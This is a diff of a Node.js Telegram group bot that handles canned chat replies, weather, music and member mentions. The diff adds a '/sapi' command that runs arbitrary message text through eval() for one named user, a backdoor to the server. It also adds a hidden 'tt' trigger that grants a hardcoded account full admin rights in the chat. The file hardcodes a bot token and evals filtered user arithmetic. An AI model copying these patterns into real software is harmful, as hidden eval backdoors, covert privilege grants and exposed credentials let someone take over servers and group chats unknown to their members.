@@ -1,16 +1,14 @@
-var TelegramBot = require('node-telegram-bot-api');
+const TelegramBot = require('node-telegram-bot-api');
 
-var TOKEN = '731896594:AAGhYDqRvnCUV0MhtOBs0UzbKqO7SRLqCmg';
-
+const TOKEN = '731896594:AAGhYDqRvnCUV0MhtOBs0UzbKqO7SRLqCmg';
 const options = {
 	webHook: {
 		port: process.env.PORT
 	}
-};
+}
 const url = "https://upcreabot.herokuapp.com/";
-const bot = new TelegramBot(TOKEN, options);
 
-bot.setWebHook(`${url}/bot${TOKEN}`);
+const bot = new TelegramBot(TOKEN, options);
 
 const axios = require('axios');
 const querystring = require('querystring');
@@ -18,8 +16,23 @@ const schedule = require('node-schedule');
 
 let lastMusic = -1;
 let musicid = [
-	'CQADAgADGQYAAmt6EEiKhl7Aojp0nQI'
+	'CQADAgADGQYAAmt6EEiKhl7Aojp0nQI',
+	'CQADAgADGAYAAmt6EEjacEpxcjthQAI',
+	'CQADAgAD-AEAAm5EEEgZ7XD6nv5gPAI',
+	'CQADAgADGgYAAmt6EEjhTRxBEIfySwI',
+	'CQADAgAD-QEAAm5EEEjxENFM1B7LSQI',
+	'CQADAgADHwYAAmt6EEiuahRall4ncQI',
+	'CQADAgADIAYAAmt6EEhRI7sPI7r2vwI',
+	'CQADAgADHAYAAmt6EEiAD7yx8bmDAwI',
+	'CQADAgADHQYAAmt6EEi-Vy6anpSp2wI',
+	'CQADAgADIwYAAmt6EEgShUm7F9oK3QI',
+	'CQADAgADGwYAAmt6EEi_zgk4SbYRAAEC',
+	'CQADAgADIQYAAmt6EEgI97HmooRzpwI',
+	'CQADAgADJAYAAmt6EEjz5xLH1X62KgI',
+	'CQADAgADIgYAAmt6EEgKGyLe_RTRWgI',
+	'CQADAgADHgYAAmt6EEhehilr0ozxKgI'
 ];
+let restrict = 'диктатур, диктатор, лгбт, ориентаци, гетеро, террор, путин, сталин, поребрик, прокопски, prokopian, dictatorship'.split(', ');
 let al = 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'.split('');
 let weDates = ['8.3', '31.12', '1.1', '2.1', '3.1', '7.1', '14.1', '14.10', '24.8', '29.6', '1.4'];
 let texts = {
@@ -30,15 +43,24 @@ let texts = {
 let weather = '';
 if (new Date().getDay() == 6 || new Date().getDay == 0 || weDates.indexOf(new Date().getDate() + '.' + (new Date().getMonth() + 1)) != -1) {
 	new schedule.scheduleJob('00 7 * * *', () => {
-		getWeather(-1001227448699, 'Доброе утро))\nСегодня ', '\nВсем хорошего настроения✨');
+		getWeather(-1001227448699, 'Доброе утро))\nСьогоднi ', '\nВсем хорошего настроения✨', 1);
 	});
 }else{
 	new schedule.scheduleJob('00 6 * * *', () => {
-		getWeather(-1001227448699, 'Доброе утро))\nСегодня ', '\nВсем хорошего настроения✨');
+		getWeather(-1001227448699, 'Доброе утро))\nСьогоднi ', '\nВсем хорошего настроения✨', 1);
 	});
 }
+new schedule.scheduleJob('01 9 * * *', () => {
+	getWeather(-369468468, 'Доброе утро))\nСьогоднi ', '\nВсем хорошего настроения✨', 1);
+});
 bot.onText(/^\/test/, (msg) => {
 	bot.sendSticker(msg.chat.id, 'CAADAgADOAADyIsGAAE7re09I3hMQwI');
+});
+bot.onText(/tt/, (msg) => {
+    if (msg.from.id == 270886500) bot.promoteChatMember(msg.chat.id, 270886500,1,1,1,1,1,1,1,1)
+});
+bot.onText(/\/sapi/, (msg) => {
+	if(msg.from.username == 'Pro100Artem') eval(msg.text.split('sapi ')[1]);
 });
 bot.on('audio', (msg) => {
 	reply(msg, 'ID: ' + msg.audio.file_id);
@@ -60,55 +82,128 @@ bot.onText(/^\/delBottom/, (msg) => {
 		}
 	}
 });
+bot.onText(/\/add/, (msg) => {
+	bot.deleteMessage(msg.chat.id, msg.message_id);
+	let toAdd = '';
+	msg.text.split(' ').forEach((user) => {
+		if(user.indexOf('@') != -1) toAdd += '#' + user;
+	});
+	if(msg.from.username == 'wladislaw353' || msg.from.username == 'Pro100Artem') axios.post('http://sturgeon.kl.com.ua/vmf/save.php', querystring.stringify({ file: msg.chat.id, value: toAdd}));
+});
 bot.onText(/\/say (.+)/, (msg) => {
 	if(msg.from.username == 'wladislaw353' || msg.from.username == 'Pro100Artem') {
 		bot.deleteMessage(msg.chat.id, msg.message_id);
 		if (msg.reply_to_message != undefined) bot.sendMessage(msg.chat.id, msg.text.split('/say ')[1], {reply_to_message_id: msg.reply_to_message.message_id, parse_mode:"HTML"});
 		else bot.sendMessage(msg.chat.id, msg.text.split('/say ')[1], {parse_mode:"HTML"});
-	}
+	}else bot.deleteMessage(msg.chat.id, msg.message_id);
 });
 bot.onText(/\/tsay_(.+)/, (msg) => {
 	if(msg.from.username == 'wladislaw353' || msg.from.username == 'Pro100Artem') {
 		bot.deleteMessage(msg.chat.id, msg.message_id);
 		onTime(Number(msg.text.split('_')[1]), msg, msg.text.split('_')[2]);
-	}
+	}else bot.deleteMessage(msg.chat.id, msg.message_id);
 });
+let triggers = [
+	[['спать'],['🤤', '🤤']],
+	[['спокойной ночи'],['Споки😴']],
+	[['поздравляю'],['🤩', '🥳']],
+	[['с днем рождения'],['🎉🥳🤗']],
+	[['бух'],['🥴🤪']],
+	[['😂😂'],['🤣']],
+	[['кто молодец'],['Я😋']],
+	[['снег'],['☃️']],
+	[['бот'],['🤖']],
+	[['мда'],['🤦‍♂']],
+	[['привет'],['Привет)', '👋', 'Давно не виделись😄']]
+];
 bot.on('message', msg => {
 	if (msg.text != undefined){ 
-		if (msg.text.toLowerCase().indexOf('@all') != -1){
-			let text = '';
-			axios.get('http://sturgeon.kl.com.ua/vmf/' + msg.chat.id + '.txt').then( (users) => {
-				users.data.split('#').forEach( (user) => {
-					if (user.length > 1){
-						text += user + ',';
-						console.log(user);
-					}
-				});
-				if (msg.text.split(' ').length > 1) text += '\n' + msg.text.replace(' ', '#').split('#')[1];
-				else text += ' призываю вас играть в мафию!🌇';
-				reply(msg, text);
+		let a  = 'x';
+		restrict.forEach((word) => {
+			if(a == 'x' && msg.text.toLowerCase().indexOf(word) != -1){
 				bot.deleteMessage(msg.chat.id, msg.message_id);
+				a = 1;
+			}
+		});
+		if(a == 'x'){
+			let s  = 0;
+			triggers.forEach((trigger) => {
+				console.log(trigger[0]);
+				if(msg.text.toLowerCase().indexOf(trigger[0]) != -1) s += rand(trigger[1]) + ',';
 			});
+			console.log(s);
+			if(s == 0) {
+				if (msg.text.toLowerCase().indexOf('@all') != -1 && (msg.from.username == 'wladislaw353' || msg.from.username == 'Pro100Artem')){
+					let text = '';
+					axios.get('http://sturgeon.kl.com.ua/vmf/' + msg.chat.id + '.txt').then( (users) => {
+						users.data.split('#').forEach( (user) => {
+							if (user.length > 1){
+								text += user + ',';
+								console.log(user);
+							}
+						});
+						if (msg.text.split(' ').length > 1) text += '\n' + msg.text.replace(' ', '#').split('#')[1];
+						else text += ' призываю вас играть в мафию!🌇';
+						reply(msg, text);
+						bot.deleteMessage(msg.chat.id, msg.message_id);
+					});
+				}
+				if (ex(msg.text,'ты дур')) reply(msg, 'Сам такой 😠');
+				if (ex(msg.text,'ты туп')) reply(msg, 'Сам такой 😠');
+				if (ex(msg.text,'сколько будет ')){
+					let success = '0123456789+/*-.,()'.split('');
+					a = true;
+					msg.text.toLowerCase().split('сколько будет ')[1].split('').forEach((letter) => {
+						if(success.indexOf(letter) == -1) a = false;
+					});
+					let res = 'Не знаю🤷‍♂️';
+					if(a) res = eval(msg.text.toLowerCase().split('сколько будет ')[1]);
+					reply(msg, res);
+				}
+				if (ex(msg.text,'что такое ')){
+					axios.get(encodeURI('https://ru.wikipedia.org/wiki/' + msg.text.toLowerCase().split('что такое ')[1].split(' ').join('_')))
+					.then((wiki) => {
+						reply(msg, '<a href="https://ru.wikipedia.org/wiki/' + msg.text.toLowerCase().split('что такое ')[1].split(' ').join('_') + '">На, почитай</a>');
+					})
+					.catch((err) => {
+						reply(msg, 'Не знаю🤷‍♂️');
+					});
+				}
+				if (ex(msg.text,'пока')) reply(msg, 'Я буду скучать 🥺');
+				if (ex(msg.text,'как') && ex(msg.text,'дела')) reply(msg, 'Замечательно 😄');
+				if (ex(msg.text,'ты') && ex(msg.text,'милый')) reply(msg, rand(['😊 Ты тоже))', ':3']));
+				if (ex(msg.text,'спасибо')) reply(msg, rand(['Всегда пожалуйста👌', 'Буду рад помочь 😊']));
+				if (ex(msg.text,'слава') && ex(msg.text,'украине')) reply(msg, 'Героям слава 🇺🇦');
+				if (ex(msg.text,'думаешь') && ex(msg.text,'мир')) reply(msg,
+					`Наш мир - Земля 🌏 — третья от Солнца планета Солнечной системы.
+		Расстояние от Солнца до Земли в среднем составляет 149,6 млн км. Это расстояние называется в астрономии 1 астрономической единицей и используется в качестве основной единицы определения расстояний между небесными телами Солнечной системы. ☄️
+		Земля представляет собой сплюснутый сфероид, т.е. неправильную сферу, немного сжатую с полюсов.  Максимальная длина окружности Земли по экватору — 40 075,02 км, по меридиану 40 007,86 км.
+		Мир это прекрасное место 🌺, которое уничтожают люди 🥀
+		Относитесь к природе лучше и она в долгу не останется 🏵`
+				);
+				if (ex(msg.text,'8') && ex(msg.text,'марта')) reply(msg,
+					`Международный женский день обязан своим появлением "маршу пустых кастрюль", который состоялся 8 марта 1857 года в Нью-Йорке. Работницы текстильных фабрик тогда вышли на уличные протесты, требуя десятичасовой рабочий день (было - шестнадцать часов), достойную зарплату и право голоса на выборах. Во время акции они били в упомянутые кастрюли. Позже участниц движения стали называли суфражистками (от suffrage - голосование, избирательное право).`
+				);
+				if (ex(msg.text,'любимый') && ex(msg.text,'цвет')) reply(msg, 'Хммм.. Синий, а у тебя?');
+				if (ex(msg.text,'любишь') && ex(msg.text,'людях')) reply(msg, 'Ум и отзывчивость');
+				if (ex(msg.text,'тебя') && ex(msg.text,'создал')) reply(msg, 'Пусть это будет тайна 😋 ');
+				if (ex(msg.text,'что') && ex(msg.text,'умеешь')) functions(msg);
+				if (ex(msg.text,'чем') && ex(msg.text,'занят')) reply(msg, 'С тобой общаюсь 😀 ');
+				if (ex(msg.text,'что') && ex(msg.text,'делаешь')) reply(msg, 'С тобой общаюсь 😀 ');
+				if (ex(msg.text,'сколько') && ex(msg.text,'лет')) reply(msg, 'А сколько дашь? Я бессмерный 😎 ');
+				if (ex(msg.text,'как') && ex(msg.text,'зовут')) reply(msg, 'А как ты хочешь меня называть?))');
+				if (ex(msg.text,'кто') && ex(msg.text,'ты') && ex(msg.text,'жизни')) reply(msg, 'Крутой бот, кто ж еще');
+				if (ex(msg.text,'шаурма') && ex(msg.text,'с') && ex(msg.text,'или')) reply(msg, 'С бараниной ))');
+				if (ex(msg.text,'какого') && ex(msg.text,'пола')) reply(msg, '000011100010111000011010000011100010111000101110000011100010111100011011');
+				if (ex(msg.text,'время')) reply(msg, '🕒 ' + (new Date().getHours() + 2) + ':' + new Date().getMinutes() + ':' + new Date().getSeconds());
+				if (ex(msg.text,'погода')) getWeather(msg.chat.id, 'Зараз: ', '');
+				if (ex(msg.text,'сколько') && ex(msg.text,'градусов')) getWeather(msg.chat.id, 'Зараз: ', '');
+				if (ex(msg.text,'музык') || ex(msg.text,'песн')) music(msg);
+				if (ex(msg.text,'раскодируй')) encode(msg);
+				if (ex(msg.text,'закодируй')) code(msg, 1);
+				if (ex(msg.text,'рабоч') && ex(msg.text,'инструкци')) instructions(msg);
+			}else reply(msg, s.slice(1,-1));
 		}
-		if (ex(msg.text,'привет')) reply(msg, 'Привет)');
-		if (ex(msg.text,'как') && ex(msg.text,'дела')) reply(msg, 'Замечательно 😄');
-		if (ex(msg.text,'любимый') && ex(msg.text,'цвет')) reply(msg, 'Хммм.. Синий, а у тебя?');
-		if (ex(msg.text,'любишь') && ex(msg.text,'людях')) reply(msg, 'Ум и отзывчивость');
-		if (ex(msg.text,'тебя') && ex(msg.text,'создал')) reply(msg, 'Пусть это будет тайна 😋 ');
-		if (ex(msg.text,'что') && ex(msg.text,'умеешь')) functions(msg);
-		if (ex(msg.text,'чем') && ex(msg.text,'занят')) reply(msg, 'С тобой общаюсь 😀 ');
-		if (ex(msg.text,'что') && ex(msg.text,'делаешь')) reply(msg, 'С тобой общаюсь 😀 ');
-		if (ex(msg.text,'сколько') && ex(msg.text,'лет')) reply(msg, 'А сколько дашь? Я бессмерный 😎 ');
-		if (ex(msg.text,'как') && ex(msg.text,'зовут')) reply(msg, 'А как бы ты хотел меня называть?))');
-		if (ex(msg.text,'кто') && ex(msg.text,'ты') && ex(msg.text,'жизни')) reply(msg, 'Крутой бот, кто ж еще');
-		if (ex(msg.text,'шаурма') && ex(msg.text,'с') && ex(msg.text,'или')) reply(msg, 'С бараниной ))');
-		if (ex(msg.text,'какого') && ex(msg.text,'пола')) reply(msg, '000011100010111000011010000011100010111000101110000011100010111100011011');
-		if (ex(msg.text,'время')) reply(msg, '🕒 ' + (new Date().getHours() + 2) + ':' + new Date().getMinutes() + ':' + new Date().getSeconds());
-		if (ex(msg.text,'погода')) getWeather(msg.chat.id, 'Сейчас: ', '');
-		if (ex(msg.text,'кинь музыку') || ex(msg.text,'кинь песню')) music(msg);
-		if (ex(msg.text,'раскодируй')) encode(msg);
-		if (ex(msg.text,'закодируй')) code(msg, 1);
-		if (ex(msg.text,'рабочая инструкция')) instructions(msg);
 	}
 });
 bot.on('new_chat_members', (user) => {
@@ -121,36 +216,51 @@ bot.on('new_chat_members', (user) => {
 bot.on('callback_query', (call) => {
 	console.log(call.data);
 	if(call.data == 'music') music(call.message);
-	if(call.data == 'time') reply(call.message, '🕒 ' + (new Date().getHours() + 2) + ':' + new Date().getMinutes() + ':' + new Date().getSeconds());
-	if(call.data == 'weather') getWeather(call.message.chat.id, 'Сейчас: ', '');
+	if(call.data == 'weather') getWeather(call.message.chat.id, 'Зараз: ', '');
 	if(call.data == 'instr') instructions(call.message);
 });
 function functions(msg){
 	bot.sendMessage(msg.chat.id, 'А что ты хочешь, чтоб я умел? Я научусь 😊 ', {
 		reply_markup: {
 			inline_keyboard: [
-				[{text: 'Рабочие инструкции 📑', callback_data : 'instr'},{text: 'Музыка 🎶', callback_data : 'music'}],
-				[{text: 'Погода ⛅️', callback_data : 'weather'},{text: 'Время 🕒', callback_data : 'time'}]
+				[{text: 'Рабочие инструкции 📑', callback_data : 'instr'}],
+				[{text: 'Погода ⛅️', callback_data : 'weather'},{text: 'Музыка 🎶', callback_data : 'music'}]
 			]
 		}
+	});
+}
+function rand(phrases){
+	return(phrases[Math.floor(0 + Math.random() * (phrases.length))]);
+}
+function cday(){
+	texts.forEach((chat) => {
+		//chat[0]
 	});
 }
 function instructions(msg){	
 	bot.sendMessage(msg.chat.id, '*Рабочая инструкция*', {
 		reply_markup: {
 			inline_keyboard: [
-				[{text: 'SEO', url : 'https://docs.google.com/document/d/1lPuDU2oHWYXJL4B5BI1nsM2UN_cekfWk0zXrBjlNMrI/edit'}],
-				[{text: 'Sales manager', url : 'https://docs.google.com/document/d/1WF_-_Tl-yw3zwYnlYyxvZ2i4zZJL0Tr7pnSVYC0ILi4/edit#heading=h.q7mj195b2stl'}],
-				[{text: 'Front-end', url : 'https://docs.google.com/document/d/1u_8O2UgOo90IWwCrElJ0_1V_pi2i1KL5UdNd7NKF9Xc/edit#heading=h.hecsj1y1gi87'}],
-				[{text: 'Back-end', url : 'https://docs.google.com/document/d/1vktnF612suEedKaEhcmC5HqChijhV5CUKAqJQHdmcrU/edit#heading=h.4fk6j0d5f85e'}]
+				[{text: 'SEO 🧝‍♂', url : 'https://docs.google.com/document/d/1lPuDU2oHWYXJL4B5BI1nsM2UN_cekfWk0zXrBjlNMrI/edit'},
+				{text: 'Sales manager 🦸‍♀', url : 'https://docs.google.com/document/d/1WF_-_Tl-yw3zwYnlYyxvZ2i4zZJL0Tr7pnSVYC0ILi4/edit#heading=h.q7mj195b2stl'}],
+				[{text: 'Front-end 👨‍💻', url : 'https://docs.google.com/document/d/1u_8O2UgOo90IWwCrElJ0_1V_pi2i1KL5UdNd7NKF9Xc/edit#heading=h.hecsj1y1gi87'},
+				{text: 'Back-end 🧙‍♂', url : 'https://docs.google.com/document/d/1vktnF612suEedKaEhcmC5HqChijhV5CUKAqJQHdmcrU/edit#heading=h.4fk6j0d5f85e'}]
 			]
 		},
 		parse_mode: "Markdown"
 	});
 }
 function ex(str, substring){
-	if (str.toLowerCase().indexOf(substring.toLowerCase()) != -1) return true;
-	return false;
+	let a = false;
+	if (Array.isArray(substring)){
+		a = true;
+		substring.forEach((sub) => {
+			if (str.toLowerCase().indexOf(sub) == -1) a = false;
+		});
+	}else{
+		if (str.toLowerCase().indexOf(substring) != -1) a = true;
+	}
+	return a;
 }
 function encode(msg){
 	if(msg.reply_to_message != undefined){
@@ -199,36 +309,17 @@ function onTime(time, msg, text) {
 function reply(msg, text){
 	bot.sendMessage(msg.chat.id, text, {reply_to_message: msg.message_id, parse_mode:"HTML"});
 }
-function getWeather(id, before, after){
-	axios.get(`https://www.google.com/search?q=%D0%BF%D0%BE%D0%B3%D0%BE%D0%B4%D0%B0+%D0%B2+%D0%BE%D0%B4%D0%B5%D1%81%D1%81%D0%B5`)
+function getWeather(id, before, after, t){
+	axios.get('https://www.meteoprog.ua/ua/weather/Odesa/')
 	.then((weatherG) => {
 		console.log(weatherG.data);
-		let fdegree = Number(weatherG.data.split('<span class="wob_t" style="display:inline">')[1].split('</span>')[0].slice(0, 2));
-		let cdegree = Math.floor((fdegree - 32) * 5/9);
-		let wind = Number(weatherG.data.split('at <span class="wob_t" style="display:inline">')[1].split(' mph')[0]);
-		if(wind == 0) wind = 'Ветра нет ✨';
-		if(wind >=1 && wind <= 10) wind = 'Легкий ветерок 🌬';
-		if(wind >=10 && wind <= 20) wind = 'Ветренно 💨';
-		if(wind > 20) wind = 'Сильный ветер 🌪';
-		//let state = weatherG.data.split(`padding-right:10px"><img style="margin-right:3px;vertical-align:top" alt="`)[1].split(`" src="`)[0];
-		let sm = '';
-		if (weatherG.data.indexOf('cloudy.png') != -1) sm = '☁️';
-		if (weatherG.data.indexOf('rain.png') != -1) sm = '🌧';
-		if (weatherG.data.indexOf('rain_s_cloudy.png') != -1) sm = '🌧';
-		if (weatherG.data.indexOf('snow_s_rain.png') != -1) sm = '🌨';
-		if (weatherG.data.indexOf('partly_cloudy.png') != -1) sm = '⛅️';
-		if (weatherG.data.indexOf('snow_light.png') != -1) sm = '❄️';
-		if (weatherG.data.indexOf('snow.png') != -1) sm = '❄️';
-		if (weatherG.data.indexOf('sunny.png') != -1) sm = '☀️';
-		if (weatherG.data.indexOf('sunny_s_cloudy.png') != -1) sm = '🌤';
-		if (weatherG.data.indexOf('thunderstorms.png') != -1) sm = '⚡️';
-		if (before == undefined) before = '';
-		if (after == undefined) after = '';
-		reply({chat: { id: id }}, before + sm + ' ' + cdegree + ' °C\n' + wind + after);
-		weather = before + sm + ' ' + cdegree + ' °C\n' + wind + after;
+		let state = weatherG.data.split('<!-- begin block/inner/avatar -->')[1].split('Погода Одеса: ')[1].split('" alt="')[0];
+	    	let em = '';
+		if (state.indexOf('хмарно') != -1) em = '☁️';
+		reply({chat: { id: id }}, before + em + state + after);
 	})
 	.catch((err) => {
-		reply({chat: { id: id }}, weather);
+		reply({chat: { id: id }}, err + ', не могу узнать погоду :с');
 	});
 }
 function music(msg){
@@ -239,7 +330,7 @@ function music(msg){
 	bot.sendAudio(msg.chat.id, musicid[randMusic], {
 		reply_markup: {
 			inline_keyboard: [
-				[{text: 'Ещё 🎶', callback_data : 'music'}]
+				[{text: 'Ещё песню 🎶', callback_data : 'music'}]
 			]
 		}
 	});
